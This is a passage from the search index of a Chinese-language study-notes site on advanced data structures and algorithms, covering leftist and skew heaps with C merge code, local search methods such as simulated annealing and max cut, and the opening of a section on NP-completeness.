\u539f\u6765\u7684\u5de6\u504f\u5806\u4ee5\u53ca\u5355\u4e2a\u8282\u70b9\u7684\u6811\u6765\u5b8c\u6210</li> </ul> Function Complexity Get Min \\(O(1)\\) Delete Min \\(O(\\log N)\\) Insert \\(O(\\log N)\\) Merge \\(O(\\log N)\\) <p>\u7531\u4e8e\u53f3\u5b50\u6811\u8f83\u5c0f\uff0c\u56e0\u6b64 Merge \u7684\u901a\u5e38\u60f3\u6cd5\u662f\u5c06\u53f3\u5b50\u6811\u4e0e\u5176\u5b83\u6811\u518d\u8fdb\u884c Merge\u3002\u4ee5\u4e0b\u662f\u5176\u62bd\u8c61\u6b65\u9aa4\uff1a</p> <ol> <li>\u5c06\u503c\u8f83\u5c0f\u7684\u6839\u4f5c\u4e3a\u65b0\u6839\uff0c\u5176 Left \u5b50\u6811\u4e0d\u53d8</li> <li>\u9012\u5f52\u5408\u5e76\u5176 Right \u5b50\u6811\u548c\u53e6\u4e00\u68f5\u6811</li> <li>\u9012\u5f52\u8fd4\u56de\u4e4b\u524d\uff0c\u81ea\u4e0b\u800c\u4e0a\u66f4\u65b0\u5404\u4e2a Merge \u64cd\u4f5c\u7684\u6839\u7684 Npl\uff1b\u5982\u679c\u4e0d\u7b26\u5408\u5de6\u504f\u5806\u6027\u8d28\uff0c\u5219\u4ea4\u6362\u5de6\u53f3\u5b50\u6811</li> </ol> <p>\u4ece\u4fee\u4f6c\u7b14\u8bb0\u6284\u6765\u7684\u9012\u5f52\u5b9e\u73b0\u65b9\u5f0f\uff1a</p> <pre><code>LeftistHeapNode * merge(Node * x, Node * y) {\n    if (x == NULL) return y;\n    if (y == NULL) return x;\n\n    if (x-&gt;val &gt; y-&gt;val) {\n        swap(x, y);\n    }\n\n    x-&gt;rs = merge(x-&gt;rs, y);\n\n    if (x-&gt;ls == NULL || x-&gt;ls-&gt;dist &lt; x-&gt;rs-&gt;dist) {\n        swap(x-&gt;ls, x-&gt;rs);\n    }\n\n    x-&gt;dist = x-&gt;rs-&gt;dist + 1;\n\n    return x;\n}\n</code></pre> <p>\u8bfe\u4ef6\u91cc\u7684\u9012\u5f52\u5b9e\u73b0\u65b9\u5f0f\uff1a</p> <pre><code>Node* Merge(Node* H1, Node* H2){\n    if(H1 == NULL) return H2;\n    if(H2 == NULL) return H1;\n    if(H1-&gt;Val &lt; H2-&gt;Val) return Merge1(H1,H2);\n    else return Merge1(H2,H1);\n}\n\n//\u9759\u6001\u5c5e\u6027\u4f7f\u5f97\u5176\u53ef\u4ee5\u5728\u5199\u9898\u65f6\u6b63\u786e\u4e92\u76f8\u8c03\u7528\nstatic Node* Merge1(Node* H1, Node* H2) {\n    if(H1-&gt;left == NULL)\n        H1-&gt;left = H2;\n    else {\n        H1-&gt;right = Merge(H1-&gt;right,H2);\n        if(H1-&gt;left-&gt;Npl &lt; H1-&gt;right-&gt;Npl)\n            swap(H1-&gt;left,H1-&gt;right);\n    } // end else\n    return H1;\n}\n</code></pre> <p>\u8fed\u4ee3\u5b9e\u73b0\u5219\u9700\u8981\u4f7f\u7528\u6808\u7ed3\u6784</p> <p></p> <p>\u76f8\u6bd4\u4e8e\u5176\u5b83 Binary Heap \uff0cLeftist Heap \u7684\u4f18\u7f3a\u70b9\u5982\u4e0b\uff1a</p> <p>Advantage of Leftist Heap:</p> <ol> <li><code>DeleteMin</code> \u548c <code>Merge</code> \u64cd\u4f5c\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(\\log N)\\) \uff0c\u662f\u6b64\u64cd\u4f5c\u6700\u6709\u6548\u7684\u6570\u636e\u7ed3\u6784\u4e4b\u4e00</li> <li>\u76f8\u5bf9\u4e8e\u5176\u5b83 Binary Heap\uff08\u5982\u6590\u6ce2\u90a3\u5951\u5806\uff09\uff0cLetist Heap \u7684\u5b9e\u73b0\u66f4\u52a0\u7b80\u5355</li> </ol> <p>Disadvantage of Leftist Heap:</p> <ol> <li><code>Insert</code> \u64cd\u4f5c\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(\\log N)\\) \uff0c\u6bd4\u5176\u5b83 Binary Heap \u6162\uff08\u5982\u4e8c\u53c9\u5806\u901a\u8fc7\u63d2\u5165\u5efa\u5806\u65b9\u5f0f\u8017\u65f6 \\(O(N)\\)\uff0c\u5219\u5747\u644a\u64cd\u4f5c\u6d88\u8017\u4e3a \\(O(1)\\)\uff09</li> <li>Leftist Heap \u4f7f\u7528\u4e86\u66f4\u591a\u7a7a\u95f4\uff0c\u56e0\u4e3a\u5b83\u9700\u8981\u7ef4\u62a4\u7a7a\u8def\u5f84\u957f\u5ea6\u7684\u503c</li> </ol>"},{"location":"Courses/DS/ADS/Leftist%20Heap%20%26%20Skew%20Heap/#skew-heap","title":"Skew Heap","text":""},{"location":"Courses/DS/ADS/Leftist%20Heap%20%26%20Skew%20Heap/#definition_1","title":"Definition","text":"<p>\u659c\u5806\uff08Skew Heap\uff09\u662f\u5de6\u504f\u5806\u7684\u7b80\u5355\u5f62\u5f0f\uff0c\u5177\u6709\u548c\u5de6\u504f\u5806\u7c7b\u4f3c\u7684\u6027\u8d28\uff0c\u4f46\u53c8\u6709\u6240\u4e0d\u540c\u3002</p> <p>\u5176\u7279\u70b9\u662f\u5728\u8fdb\u884c Merge \u64cd\u4f5c\u65f6\uff0c\u65e0\u6761\u4ef6\u8fdb\u884c\u5de6\u53f3\u5b50\u6811\u7684 Swap\uff0c\u8fd9\u6837\u5c31\u4e0d\u9700\u8981\u5728\u9012\u5f52\u8c03\u7528\u7ed3\u675f\u65f6\u989d\u5916\u5224\u65ad\u5de6\u53f3\u5b50\u6811\u7684 Npl \u662f\u5426\u7b26\u5408\u8981\u6c42\u3002</p> \u5408\u5e76\u524d\u5408\u5e76\u540e <p></p> <p></p> <p>\u6309\u7167\u987a\u5e8f\u63d2\u5165 \\(1\\sim 2^k-1\\) \uff0c\u6700\u7ec8\u7684\u5806\u5448\u73b0\u6ee1\u4e8c\u53c9\u6811\u5f62\u72b6\uff0c\u4e0d\u8fc7\u4e0d\u80fd\u636e\u6b64\u7b80\u5355\u586b\u5165\u6570\u636e</p> <p></p>"},{"location":"Courses/DS/ADS/Leftist%20Heap%20%26%20Skew%20Heap/#_1","title":"\u5747\u644a\u5206\u6790","text":"<p>\u5bf9 Skew Heap \u7684 Merge \u64cd\u4f5c\u8fdb\u884c\u5747\u644a\u5206\u6790\uff0c\u5b9a\u4e49\u52bf\u80fd\u51fd\u6570 \\(\\phi(D_i)\\) \u4e3a\u4ee5 \\(D_i\\) \u4e3a\u6839\u8282\u70b9\u7684\u6811\u7684 Heavy Nodes \u7684\u6570\u91cf\uff0c\u5176\u4e2d Heavy Nodes \u5b9a\u4e49\u4e3a\u53f3\u5b50\u6811\u7684\u8282\u70b9\u6570\u5927\u4e8e\u7b49\u4e8e\u5de6\u5b50\u6811\u7684\u8282\u70b9\u6570\u7684 Node\u3002</p> <p>\u90a3\u4e48\u5bf9\u4e8e Heavy Nodes \u4ee5\u53ca\u76f8\u5bf9\u7684 Light Nodes\uff0c\u6709\u5982\u4e0b\u6027\u8d28\uff1a</p> <ul> <li>\u4efb\u610f\u4e0d\u5728\u53f3\u8def\u5f84\u7684\u8282\u70b9\uff0c\u5176\u5728\u5f52\u5e76\u524d\u540e\u5de6\u53f3\u5b50\u6811\u4e0d\u53d8\u5316\uff0c\u5373\u8f7b\u91cd\u60c5\u51b5\u4e5f\u4e0d\u53d8</li> <li>\u53f3\u8def\u5f84\u4e0a\u6240\u6709\u91cd\u8282\u70b9\u5728\u5f52\u5e76\u540e\u5168\u90e8\u53d8\u4e3a\u8f7b\u8282\u70b9\uff0c\u800c\u8f7b\u8282\u70b9\u4e0d\u4e00\u5b9a\u53d8\u4e3a\u91cd\u8282\u70b9</li> </ul> <p>\u6839\u636e\u4ee5\u4e0a\u6027\u8d28\u53ef\u4ee5\u8fdb\u884c Merge \u64cd\u4f5c\u7684\u5747\u644a\u5206\u6790\u3002</p> <p>\u7531\u4e8e\u975e\u53f3\u8def\u5f84\u8282\u70b9\u4e0d\u53c2\u4e0e\u8f7b\u91cd\u53d8\u5316\uff0c\u6240\u4ee5\u53ef\u4ee5\u5ffd\u7565\u5b83\u4eec\u7684\u6570\u91cf\u3002\u4ee5 \\(l_1,h _1\\) \u5206\u522b\u6307\u4ee3\u7b2c\u4e00\u9897\u6811\u53f3\u8def\u5f84\u4e0a\u8f7b\u8282\u70b9\u548c\u91cd\u8282\u70b9\u7684\u6570\u91cf\uff0c\\(l,h\\) \u5206\u522b\u6307\u4ee3\u5176\u5b83\u8f7b\u91cd\u8282\u70b9\uff0c\u5219\u6700\u574f\u60c5\u51b5\u4e0b\uff0c\u5047\u8bbe\u53f3\u8def\u5f84\u4e0a\u6240\u6709\u8f7b\u8282\u70b9\u90fd\u53d8\u4e3a\u91cd\u8282\u70b9\uff1a</p> \\[\\begin{array}c T_{worst} = l_1 +h_1+ l_2 +h_2 \\\\ \\text{Before Merge: }\\  \\phi_i = h_1 +h_2 +h \\\\ \\text{After Merge: }\\ \\phi_{i+1}\\le l_1 + l_2 +h \\\\  T_{amortized} = T_{worst} +\\phi _{i+1} -\\phi_i \\le 2(l_1 +l_2) \\end{array} \\] <p>\u53c8\u53f3\u8def\u5f84\u957f\u5ea6\u53d7\u9650\u4e8e \\(O(\\log N)\\) \uff0c\u5219 \\(T_{amortized} = O(\\log N)\\)</p>"},{"location":"Courses/DS/ADS/Local%20Search/","title":"Local Search","text":""},{"location":"Courses/DS/ADS/Local%20Search/#local-search","title":"Local Search","text":"<p> \u7ea6 1653 \u4e2a\u5b57  40 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 9 \u5206\u949f</p>"},{"location":"Courses/DS/ADS/Local%20Search/#overview","title":"Overview","text":"<p>\u5c40\u90e8\u641c\u7d22\u7b97\u6cd5\u662f\u53e6\u5916\u4e00\u79cd\u89e3\u51b3 Hard \u95ee\u9898\u7684\u5957\u8def\uff0c\u5b83\u4e0d\u8986\u76d6\u6574\u4e2a\u641c\u7d22\u7a7a\u95f4\u800c\u5bf9\u5c40\u90e8\u8fdb\u884c\u641c\u7d22\uff0c\u53d6\u5f97\u5c40\u90e8\u6700\u4f18\u89e3\uff0c\u56e0\u6b64\uff0cLocal Search \u4e5f\u662f Approximately \u7684\u3002</p> <ul> <li>Local Optimum: \u5728\u53ef\u884c\u96c6 FS \u7684\u67d0\u90bb\u57df neighborhood \u4e2d\u6700\u4f18\u7684\u89e3</li> <li>Search: \u4ece\u67d0\u4e2a\u53ef\u884c\u89e3 \\(S\\in FS\\) \u5f00\u59cb\uff0c\u8fdb\u884c\u5fae\u5c0f\u4fee\u6539 \\(S\\sim S'\\) \uff0c\u4f7f\u5f97\u5176\u4ecd\u4e3a\u53ef\u884c\u89e3\u4e14\u66f4\u4f18 (\\(cost(S') \\lt cost(S)\\))\uff1b\u5f53\u65e0\u6cd5\u4fee\u6539\u65f6 search \u7ed3\u675f<ul> <li>\\(N(S)\\)\uff1aneighborhood of \\(S\\) - the set \\(\\{S':S\\sim S'\\}\\) </li> </ul> </li> </ul> <p>\u90bb\u57df\u5b9a\u4e49\u8d8a\u5c0f\uff0c\u641c\u7d22\u901f\u5ea6\u8d8a\u5feb\uff0c\u4f46\u8d8a\u5bb9\u6613\u5361\u5728\u5c40\u90e8\u6700\u4f18\u89e3\uff1b\u90bb\u57df\u8d8a\u5927\uff0c\u5219\u8d8a\u63a5\u8fd1\u66b4\u529b\u641c\u7d22\uff0c\u641c\u7d22\u901f\u5ea6\u6162</p>"},{"location":"Courses/DS/ADS/Local%20Search/#vertex-cover-problem","title":"\u7ecf\u5178\u6848\u4f8b\uff1aVertex Cover Problem","text":"<p>\u5b9a\u4e49 Local Search \u7684\u68af\u5ea6\u4e0b\u964d\u7b97\u6cd5\u57fa\u672c\u6846\u67b6\uff1a</p> <pre><code>SolutionType Gradient_descent()\n{   Start from a feasible solution S in FS ;\n    MinCost = cost(S);\n    while (1) {\n        S\u2019 = Search( N(S) ); /* find the best S\u2019 in N(S) */\n        CurrentCost = cost(S\u2019);\n        if ( CurrentCost &lt; MinCost ) {\n            MinCost = CurrentCost;\n            S = S\u2019;\n        }\n        else  break;\n    }\n    return S;\n}\n</code></pre> <p>Vertex Cover Problem(Opti.Ver) Given an undirected graph \\(G(V,E)\\). Find a minimum subset \\(S\\in V\\) such that for each edge \\((u,v)\\) in \\(E\\), either \\(u\\) or \\(v\\) is in \\(S\\).</p> <p>\u8fd9\u4e2a\u7248\u672c\u7684\u9876\u70b9\u8986\u76d6\u95ee\u9898\u5e76\u4e0d\u662f\u7ed9\u51fa\u53c2\u6570K\u5224\u65ad\u80fd\u5426\u7528K\u4e2a\u9876\u70b9\u8986\u76d6\u6240\u6709\u8fb9\uff0c\u6240\u4ee5\u8fd9\u662fNPC\u95ee\u9898</p> <p>\u5bf9\u4e8e Local Search \uff0c\u641c\u7d22\u7684\u8d77\u70b9\u53ef\u4ee5\u662f\u4efb\u610f\u7684\u53ef\u884c\u89e3\u3002\u56e0\u6b64\uff0c\u9876\u70b9\u8986\u76d6\u95ee\u9898\u7684\u8d77\u70b9\u53ef\u4ee5\u9009\u62e9\u6240\u6709\u7684\u70b9\u96c6\uff08\u540c\u65f6\u8fd9\u4e5f\u662f\u6700\u5dee\u7684\u7b54\u6848\uff09\u3002</p> <ul> <li>\\(cost(S)= |S|\\)</li> <li>\\(S\\sim S'\\)\uff1a\\(S'\\) can be obtained from \\(S\\) by adding or deleting a single node<ul> <li>\u601d\u8003: \u4e3a\u4ec0\u4e48\u6709 adding \u64cd\u4f5c\uff1f\u8fd9\u4e2a\u64cd\u4f5c\u662f\u5426\u8ba9\u6211\u4eec\u8fdc\u79bb\u4e86\u5c40\u90e8\u6700\u4f18\u89e3\uff1f</li> </ul> </li> <li>Search\uff1a\u6bcf\u6b21\u5220\u9664\u4e00\u4e2a\u9876\u70b9\uff0c\u5e76\u5224\u65ad\u6b64\u65f6\u7684 \\(S'\\) \u662f\u5426\u662f\u4e00\u4e2a\u9876\u70b9\u8986\u76d6\u5b50\u96c6<ul> <li>\u6bcf\u6b21\u5c40\u90e8\u641c\u7d22\u7684\u8303\u56f4\u662f\u5f53\u524d\u5b50\u96c6\u9876\u70b9\u7684\u4e2a\u6570\uff0c\u56e0\u6b64\u8be5\u7b97\u6cd5\u7684\u8fd0\u884c\u662f\u6709\u9650\u7684</li> </ul> </li> </ul> <p>\u4f46\u662f\u663e\u800c\u6613\u89c1\u7684\uff0c\u5728\u68af\u5ea6\u4e0b\u964d\u6cd5\u968f\u673a\u9009\u53d6\u8282\u70b9\u5220\u53bb\u7684\u60c5\u51b5\u4e0b\uff0c\u7531\u4e8e\u5b58\u5728\u5f88\u591a\u901a\u5411\u6b21\u4f18\u89e3\u7684\u8def\u5f84\uff0c\u635f\u5931\u51fd\u6570\u7684\u503c\u4e0d\u518d\u53d8\u5316\u65f6\u53ef\u80fd\u662f\u9677\u5165\u4e86\u5c40\u90e8\u6700\u4f18\u89e3\uff0c\u800c\u4e0d\u662f\u5168\u5c40\u6700\u4f18\u89e3\u3002</p> <p></p> <p>\u68af\u5ea6\u4e0b\u964d\u6cd5\u7684 Search</p> <p>\u5c3d\u7ba1\u68af\u5ea6\u4e0b\u964d\u6cd5\u662f\u9009\u62e9\u5c40\u90e8\u6700\u4f18\u7684\u65b0\u89e3\uff0c\u4f46\u662f\u5bf9\u4e8e\u9876\u70b9\u8986\u76d6\u95ee\u9898\uff0c\u65e0\u8bba\u5220\u53bb\u54ea\u4e2a\u70b9\u51cf\u5c11\u7684 \\(cost\\) \u5747\u76f8\u540c\uff0c\u90a3\u4e48\u5c40\u90e8\u6700\u4f18\u89e3\u53ef\u4ee5\u662f\u6240\u6709\u80fd\u5220\u53bb\u7684\u9876\u70b9\uff0c\u56e0\u6b64\u4e5f\u5c31\u76f8\u5f53\u4e8e\u968f\u673a\u9009\u62e9\u4e86\u3002</p> <p>Metropolis Algorithm \u662f\u5bf9\u8be5\u7b97\u6cd5\u7684\u4e00\u4e2a\u4f18\u5316\uff1a</p> <pre><code>SolutionType Metropolis()\n{   Define constants k and T;\n    Start from a feasible solution S in FS ;\n    MinCost = cost(S);\n    while (1) {\n        S\u2019 = Randomly chosen from N(S); // allow adding\n        CurrentCost = cost(S\u2019);\n        if ( CurrentCost &lt; MinCost ) {\n            MinCost = CurrentCost;    S = S\u2019;\n        }\n        else {\n            With a probability e^{-\u0394cost/kT}, let S = S\u2019;\n            else  break;\n        }\n    }\n    return S;\n}\n</code></pre> <p>\u5176\u4e2d\u53c2\u6570 \\(k\\) \u662f\u4e00\u4e2a\u5e38\u6570\uff0c\u552f\u4e00\u53ef\u8c03\u8282\u7684\u53c2\u6570\u662f\u6e29\u5ea6 \\(T\\)\u3002\u5bf9\u4e8e\u6982\u7387 \\(e^{-\\Delta cost / kT}\\) \uff0c\\(T\\) \u8d8a\u5927\uff0c\u6982\u7387\u5c31\u8d8a\u63a5\u8fd1 1\u3002\u5373\uff0c\u6e29\u5ea6\u8d8a\u4f4e\uff0c\u8be5\u7b97\u6cd5\u5c31\u8d8a\u63a5\u8fd1\u68af\u5ea6\u4e0b\u964d\u7b97\u6cd5\uff1b\u6e29\u5ea6\u8d8a\u9ad8\uff0c\u8be5\u7b97\u6cd5\u5c31\u8d8a\u503e\u5411\u4e8e\u8df3\u51fa\u5c40\u90e8\u6700\u4f18\u89e3\u3002</p> <p>\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u5408\u7406\u7684\u6e29\u5ea6\u8bbe\u8ba1\uff0c\u7406\u60f3\u60c5\u51b5\u4e0b\uff0c\u5728\u8d8a\u63a5\u8fd1\u5168\u5c40\u6700\u4f18\u89e3\u65f6\u6e29\u5ea6 \\(T\\) \u5e94\u8be5\u8d8a\u4f4e\u3002\u4e3a\u4e86\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd\uff0c\u63d0\u51fa\u4e00\u4e2a\u65b0\u7684\u7b97\u6cd5 Simulated Annealing(\u6a21\u62df\u9000\u706b) \u3002</p> <p>\u6a21\u62df\u9000\u706b\u7b97\u6cd5\u6b63\u5982\u5b57\u9762\u610f\u601d\uff0c\u662f\u6a21\u4eff\u73b0\u5b9e\u4e2d\u9000\u706b\u964d\u6e29\u7684\u6e29\u5ea6\u53d8\u5316\uff0c\u5176\u601d\u60f3\u5728\u4e8e\u7ed9\u51fa\u4e00\u4e2a\u6e29\u5ea6\u4e0b\u964d\u8868\uff1a \\(T=\\{T_1, T_2,...\\}\\)</p> <p>\u4e0d\u662f\u6211\u621b\u7136\u800c\u6b62\u4e86\uff0c\u800c\u662f\u8bfe\u4ef6\u8bb2\u4e86\u8fd9\u4e9b\u5c31\u8fc7\u4e86</p>"},{"location":"Courses/DS/ADS/Local%20Search/#hopfield-neural-networks","title":"\u7ecf\u5178\u6848\u4f8b\uff1aHopfield Neural Networks","text":"<p>\u5bf9\u4e8e\u4e00\u4e2a\u5e26\u6743\u56fe \\(G=(V,E)\\)\uff0c\u5982\u679c\u4e00\u4e2a\u8fb9\u7684\u6743\u91cd\u5c0f\u4e8e 0\uff0c\u90a3\u5b83\u7684\u4e24\u7aef\u9876\u70b9\u9700\u8981\u5904\u4e8e\u540c\u4e00\u4e2a\u72b6\u6001\uff1b\u5982\u679c\u4e00\u4e2a\u8fb9\u7684\u6743\u91cd\u5927\u4e8e 0\uff0c\u90a3\u4e48\u5b83\u7684\u4e24\u7aef\u9876\u70b9\u9700\u8981\u5904\u4e8e\u4e0d\u540c\u72b6\u6001\u3002\u8fb9\u6743\u7684\u7edd\u5bf9\u503c\u8d8a\u5927\uff0c\u5c31\u8d8a\u9700\u8981\u6ee1\u8db3\u8be5\u8981\u6c42\u3002</p> <p>\u7b80\u5316\u6765\u770b\uff0c\u53ef\u4ee5\u4f7f\u7528 \u00b11 \u6765\u8868\u793a\u5404\u4e2a\u72b6\u6001\uff0c\u90a3\u4e48\u53ef\u4ee5\u7528 \\(w_e S_u S_v\\lt 0\\) \u6765\u5224\u65ad\u662f\u5426\u6ee1\u8db3\u6761\u4ef6</p> <p>\u5f88\u591a\u65f6\u5019\uff0c\u6211\u4eec\u4e0d\u80fd\u5f97\u5230\u6ee1\u8db3\u6240\u6709\u8981\u6c42\u7684\u56fe\uff0c\u56e0\u6b64\u6211\u4eec\u9000\u800c\u6c42\u5176\u6b21\uff0c\u671f\u671b\u5f97\u5230\u4e00\u4e2a Stable \u7684\u7ed3\u679c\uff1a</p> <ul> <li>Definition In a configuration \\(S\\), edge \\(e=(u,v)\\) is good if \\(w_e S_u S_v\\lt 0\\); otherwise, it is bad.</li> <li>Definition In a configuration \\(S\\), a node \\(u\\) is satisfied if the weight of incident good edge \\(\\ge\\) weight of incident bad edge.<ul> <li>\\(\\sum_{v:e=(u,v)} w_e S_u S_v\\le 0\\)</li> </ul> </li> <li>Definition A configuration is stable if all nodes are statisfied.</li> </ul> <p>\u4f7f\u7528\u4e00\u4e2a\u975e\u5e38\u7b80\u5355\u7684\u72b6\u6001\u8df3\u8f6c\u7b97\u6cd5\u6765\u5b9e\u73b0\u5c06\u4e0d\u7a33\u5b9a\u7684\u914d\u7f6e\u8f6c\u6362\u5230\u7a33\u5b9a\u7684\u914d\u7f6e\uff1a</p> <pre><code>ConfigType State_flipping()\n{\n    Start from an arbitrary configuration S;\n    while ( ! IsStable(S) ) {\n        u = GetUnsatisfied(S);\n        s_u = - s_u;\n    }\n    return S;\n}\n</code></pre> <p>\u7f6e\u53cd\u4e00\u4e2a\u9876\u70b9\uff0c\u90a3\u4e48\u5b83\u7684 Good Edge \u4f1a\u53d8\u6210 Bad Edge\uff0c\u76f8\u5e94\u7684\uff0cBad Edge \u53d8\u6210 Good Edge\uff1b\u7531\u4e8e\u7f6e\u53cd\u8be5\u70b9\u7684\u524d\u63d0\u6761\u4ef6\u662f\u5b83\u7684\u574f\u8fb9\u6743\u91cd\u5927\u4e8e\u597d\u8fb9\u6743\u91cd\uff0c\u90a3\u4e48\u7f6e\u53cd\u540e\u5b83\u7684\u597d\u8fb9\u6743\u91cd\u5c31\u5927\u4e8e\u574f\u8fb9\u6743\u91cd\u4e86\u3002\u4e0d\u8fc7\u6b64\u65f6\u4e0e\u8be5\u70b9\u76f8\u8fde\u7684\u9876\u70b9\u7684\u662f\u5426 Satisfied \u5c31\u6709\u5f85\u5224\u65ad\u4e86\u3002</p> <p>\u8fd9\u4e5f\u8bf4\u660e\u4e86\uff0c\u6bcf\u6b21\u7f6e\u53cd\u4e00\u4e2a\u9876\u70b9\uff0c\u6574\u4f53\u4e0a\u597d\u8fb9\u6743\u91cd\u4f1a\u589e\u52a0\uff0c\u574f\u8fb9\u6743\u91cd\u4f1a\u51cf\u5c11\u3002\u7531\u4e8e\u4e00\u4e2a\u56fe\u7684\u8fb9\u6743\u91cd\u548c\u6709\u4e0a\u9650\uff0c\u6240\u4ee5\u8be5\u7b97\u6cd5\u4e5f\u4e00\u5b9a\u5b58\u5728\u7ec8\u70b9\uff0c\u5373\u8be5\u7b97\u6cd5\u662f Finite \u7684\uff0c\u4e14\u6700\u591a\u6267\u884c \\(\\sum _e W_e\\) \u6b65\u3002</p> <p>\u5c06\u5176\u8f6c\u6362\u4e3a Local Search \u95ee\u9898\uff0c\u6211\u4eec\u4e0d\u4ec5\u5e0c\u671b\u5f97\u5230 Stable \u7684\u89e3\uff0c\u8fd8\u5e0c\u671b\u89e3\u7684 Good Edge \u6743\u91cd\u548c\u6700\u5927\u5316\uff1a</p> <ul> <li>Problem\uff1a\u6700\u5927\u5316\u597d\u8fb9\u7684\u6743\u91cd\u548c</li> <li>Feasible Solution set FS\uff1aConfigurations</li> <li>\\(S\\sim S'\\)\uff1a\\(S'\\) can be obtained from \\(S\\) by flipping a single state</li> </ul>"},{"location":"Courses/DS/ADS/Local%20Search/#the-maximum-cut-problem","title":"\u7ecf\u5178\u6848\u4f8b\uff1aThe Maximum Cut Problem","text":"<p>\u7ed9\u5b9a\u4e00\u4e2a\u6b63\u8fb9\u6743\u65e0\u5411\u56fe \\(G=(V,E)\\)\uff0c\u5c06\u8282\u70b9 partition \u6210\u4e24\u4e2a cut \\((A,B)\\)\uff0c\u6211\u4eec\u5e0c\u671b\u4e24\u4e2a cut \u4e4b\u95f4\u7684\u6240\u6709\u8fb9\u6743\u548c\u6700\u5927\u3002</p> \\[ w(A,B):= \\sum_{u\\in A, v\\in B} w_{uv} \\] <p>\u8be5\u95ee\u9898\u5b9e\u9645\u4e0a\u5c31\u662f Hopfield Neural Networks \u7684\u7279\u4f8b\uff0c\u5373\u6240\u6709 \\(w_e\\gt 0\\)\uff0c\u6b64\u65f6\u5c06\u6240\u6709\u72b6\u6001\u4e3a +1 \u7684\u8282\u70b9\u5206\u4e3a \\(A\\)\uff0c\u72b6\u6001\u4e3a -1 \u7684\u8282\u70b9\u5206\u4e3a \\(B\\)\uff0c\u5219 \\(w(A,B)\\) \u5c31\u662f\u597d\u8fb9\u6743\u91cd\u4e4b\u548c\uff1a</p> <ul> <li>Problem\uff1a\u6700\u5927\u5316 \\(w(A,B)\\)</li> <li>Feasible Solution set FS\uff1aAny partition \\((A,B)\\)</li> <li>\\(S\\sim S'\\)\uff1a\\(S'\\) can be obtained from \\(S\\) by moving one node from \\(A\\) to \\(B\\), or \\(B\\) to \\(A\\)</li> </ul> <p>\u65f6\u95f4\u590d\u6742\u5ea6</p> <p>\u867d\u7136\u53ef\u4ee5\u4fdd\u8bc1\u8be5\u7b97\u6cd5\u662f Finite \u7684\uff0c\u4f46\u662f\u65f6\u95f4\u590d\u6742\u5ea6\u5173\u4e8e \\(N\\) \u548c \\(\\log \\sum w\\) \u90fd\u662f\u7ebf\u6027\u5173\u7cfb\uff0c\u8fd9\u610f\u5473\u7740\u53ea\u6709 \\(\\log \\sum w\\) \u4e3a \\(N\\) \u7684 Polynomial \u5173\u7cfb\u65f6\uff0c\u6574\u4f53\u65f6\u95f4\u590d\u6742\u5ea6\u624d\u662f\u591a\u9879\u5f0f\u7ea7\u522b\u3002</p> <p>Approximation \\((A,B)\\) \u4e3a\u5c40\u90e8\u641c\u7d22\u5f97\u5230\u7684 Local Optimal Partition\uff0c\\((A^*, B^*)\\) \u4e3a\u5168\u5c40\u6700\u4f18\u5212\u5206\uff0c\u90a3\u4e48\u4e00\u5b9a\u6709 \\(w(A,B)\\ge \\frac{1}{2} w(A^*, B^*)\\)\uff0c\u5373\u8be5\u7b97\u6cd5\u7684\u8fd1\u4f3c\u6bd4\u4e3a 2\u3002</p> <p>\u4e8b\u5b9e\u4e0a\uff0c\u8fd9\u4e2a\u95ee\u9898\u7684\u8fd1\u4f3c\u6bd4\u7406\u8bba\u4e0b\u9650\u4e3a \\(17 / 16\\) \uff08Unless P=NP\uff09</p> <p>\u5982\u679c\u6211\u4eec\u4e3a\u7ffb\u8f6c\u8bbe\u7f6e\u4e00\u4e2a\u9608\u503c\uff0c\u5373\u4e00\u4e2a Node \u4f1a\u88ab\u7ffb\u8f6c\u5f53\u4e14\u4ec5\u5f53\u5b83\u4f1a\u589e\u52a0\u603b cut value \u81f3\u5c11\uff1a</p> \\[ \\frac{2\\varepsilon}{|V|} w(A,B) \\] <p>\u90a3\u4e48\u6709\u4ee5\u4e0b\u4e24\u70b9\u6027\u8d28\uff08\u53ef\u80fd\u4f1a\u8003\uff09\uff1a</p> <ul> <li>\u6700\u7ec8\u7ed3\u679c \\((2+\\varepsilon) w(A,B)\\ge w(A^*, B^*)\\)\uff0c\u5373\u8fd1\u4f3c\u6bd4\u4e3a \\(2+\\varepsilon\\)</li> <li>\u7b97\u6cd5\u4f1a\u5728 \\(O(\\frac{n}{\\varepsilon} \\log N)\\) \u6b21\u7ffb\u8f6c\u5185\u7ed3\u675f</li> </ul>"},{"location":"Courses/DS/ADS/NP-Completeness/","title":"NP-Completeness","text":""},{"location":"Courses/DS/ADS/NP-Completeness/#np-completeness","title":"NP-Completeness","text":"<p> \u7ea6 1446 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p> <p>NP-Complete Problem</p> <p>\u5bf9\u4e8e NP \u5b8c\u5168\u95ee\u9898\uff0c\u76ee\u524d\u8fd8\u6ca1\u53d1\u73b0\u591a\u9879\u5f0f\u65f6\u95f4\u7b97\u6cd5\uff0c\u4f46\u4e5f\u6ca1\u4eba\u80fd\u8bc1\u660e\u4efb\u610f NP \u5b8c\u5168\u95ee\u9898\u4e0d\u5b58\u5728\u591a\u9879\u5f0f\u7ea7\u522b\u7684\u7b97\u6cd5\u3002\u4e00\u4e9b\u6211\u4eec\u719f\u77e5\u7684\u95ee\u9898\u7a0d\u5fae\u6539\u52a8\uff0c\u53ef\u80fd\u5c31\u53d8\u6210\u4e86\u4e00\u4e2a NP \u5b8c\u5168\u95ee\u9898\uff1a</p> <ul> <li>Longest Simple Path \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u8fea\u6770\u65af\u7279\u62c9\u7b97\u6cd5\u5728\u4e00\u4e2a\u6709\u5411\u56fe\u4e2d\u627e\u5230\u5355\u6e90\u6700\u77ed\u8def\u5f84\uff0c\u4f46\u662f\u5374\u4e0d\u80fd\u4f7f\u7528\u591a\u9879\u5f0f\u65f6\u95f4\u89e3\u51b3\u6709\u5411\u56fe\u7684\u6700\u957f\u7b80\u5355\u8def\u5f84\u3002<ul> 